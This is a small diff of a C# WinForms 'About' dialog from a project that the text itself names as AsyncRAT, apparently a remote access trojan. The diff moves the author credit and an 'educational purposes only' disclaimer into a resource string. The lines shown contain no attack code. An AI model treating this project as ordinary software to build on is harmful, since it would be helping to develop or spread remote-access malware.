@@ -44,9 +44,7 @@
             this.richTextBox1.ShortcutsEnabled = false;
             this.richTextBox1.Size = new System.Drawing.Size(557, 210);
             this.richTextBox1.TabIndex = 0;
-            this.richTextBox1.Text = "\n       │ Author      : NYAN CAT\n       │ Name       : AsyncRAT © 2019\n       │ C" +
-    "ontact    : github.com/NYAN-x-CAT\n\n       This program is distributed for educat" +
-    "ional purposes only.\n\n";
+            this.richTextBox1.Text = resources.GetString("richTextBox1.Text");
             this.richTextBox1.ZoomFactor = 1.1F;
             // 
             // FormAbout
